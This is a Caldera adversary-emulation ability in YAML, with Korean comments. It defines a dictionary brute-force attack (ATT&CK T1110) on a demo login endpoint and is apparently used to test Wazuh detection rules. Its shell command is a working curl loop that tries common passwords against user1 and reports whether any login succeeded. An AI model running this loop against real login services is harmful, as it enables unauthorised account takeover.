# DEMO-ONLY weak credential (user1/password). 의도적 취약 데모 계정 — 실비밀 아님.
# 실제 운영 비밀(DB/API key)은 .env 로 분리(ISMS-P/CWE-798). AN1276 반복실패→성공 재현용.
- id: 7aa89a87-3fd7-4d52-8c9e-1e5b2f4c6a3d
  name: Brute Force - Dictionary-Based Authentication Attack
  description: >-
    Dictionary brute force against /api/auth/login. 공격자 측에서 응답 코드를 보고 verdict(bf.verdict)와
    근거(bf.evidence.kind)를 fact 로 산출한다 (결정1). 하나라도 200(인증 성공)이면 SUCCEEDED/CREDENTIAL_VALID,
    전부 실패면 FAILED. 자격증명·토큰 원문은 기록하지 않는다. 매핑 T1110. 탐지 대상 Wazuh rule 100230~100233.
    주의: Caldera 는 명령 개행을 제거하므로 각 구문은 ';' 로 종료한다.
  tactic: credential-access
  technique:
    attack_id: T1110
    name: Brute Force
  platforms:
    linux:
      sh:
        command: |-
          OP_ID="#{paw}";
          TECH_ID="T1110";
          ABILITY_ID="7aa89a87-3fd7-4d52-8c9e-1e5b2f4c6a3d";
          TARGET="http://#{target.url}";
          H1="X-Caldera-Op-Id: ${OP_ID}";
          H2="X-Caldera-Technique: ${TECH_ID}";
          H3="X-Caldera-Ability: ${ABILITY_ID}";
          UA="Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}";
          WIN=none;
          for p in 123456 Password1 admin123 qwerty test letmein 000000 abc123 root admin welcome 111111 password123; do CODE=$(curl -s -m 8 -o /dev/null -w "%{http_code}" -X POST -H "$H1" -H "$H2" -H "$H3" -H "Content-Type: application/json" -A "$UA" -d "{\"username\":\"user1\",\"password\":\"$p\"}" "${TARGET}/api/auth/login"); [ "$CODE" = "200" ] && WIN=yes; done;
          V=FAILED; K=none;
          if [ "$WIN" = "yes" ]; then V=SUCCEEDED; K=CREDENTIAL_VALID; fi;
          printf '{"verdict":"%s","evidence_kind":"%s"}\n' "$V" "$K";
        parsers:
          plugins.stockpile.app.parsers.json:
          - source: bf.verdict
            custom_parser_vals:
              json_key: verdict
              json_type: str
          - source: bf.evidence.kind
            custom_parser_vals:
              json_key: evidence_kind
              json_type: str
